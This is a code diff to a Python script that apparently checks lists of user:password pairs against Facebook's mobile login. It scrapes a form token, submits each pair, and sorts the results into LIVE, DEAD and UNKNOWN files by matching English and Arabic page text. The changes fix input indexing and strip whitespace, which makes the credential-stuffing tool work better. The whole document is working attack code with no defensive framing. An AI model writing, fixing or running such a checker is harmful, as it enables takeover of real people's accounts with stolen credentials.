@@ -42,7 +42,6 @@ def start(USER,PASS):
     lsd = Rq_Get_1.text[re.search('name="lsd" value="',Rq_Get_1.text).end():re.search('" autocomplete="off" /><input type="hidden" name="jazoest"',Rq_Get_1.text).start()]
     ###----UpdateJar----###
     cookieJar.update(Rq_Get_1.cookies)
-    print(cookieJar)
     ###----PostRq----###
     Rq_Post_0 = rq.session()
     Rq_Post_0.headers.update(headers)
@@ -65,21 +64,21 @@ def start(USER,PASS):
     #with open("result.html","w") as result:
      #   result.write(Rq_Post_0_send.text)
     if "هل نسيت كلمة السر؟" in Rq_Post_0_send.text or "Forgotten password?" in Rq_Post_0_send.text :
-        print(USER+":"+PASS+"[DEAD]")
+        print(USER.rstrip()+":"+PASS.rstrip()+"[DEAD]")
         with open("resultDEAD.text","a") as resultDEAD:
-            resultDEAD.write(USER+":"+PASS)
+            resultDEAD.write(USER.rstrip()+":"+PASS.rstrip())
     elif "https://mbasic.facebook.com/login/save-device" in Rq_Post_0_send.url or "بحث عن أصدقاء" in Rq_Post_0_send.text or "Find Friends" in Rq_Post_0_send.text :
-        print(USER+":"+PASS+"[LIVE]")
+        print(USER.rstrip()+":"+PASS.rstrip()+"[LIVE]")
         with open("resultsLIVE.text","a") as resultLIVE:
-            resultLIVE.write(USER+":"+PASS)
+            resultLIVE.write(USER.rstrip()+":"+PASS.rstrip())
     else :
         with open("resultsUNKOWN.text","a") as resultsUNKOWN:
-            resultsUNKOWN.write(USER+":"+PASS)
+            resultsUNKOWN.write(USER.rstrip()+":"+PASS.rstrip())
 i = 0
 while i <= len(list(_input)) :
     if Q2 == "1":
-        USER = _input
-        PASS = _input
+        USER = str(_input[i])
+        PASS = str(_input[i])
     else:
         USER, PASS = _input[i].split(":")
     start(USER,PASS)
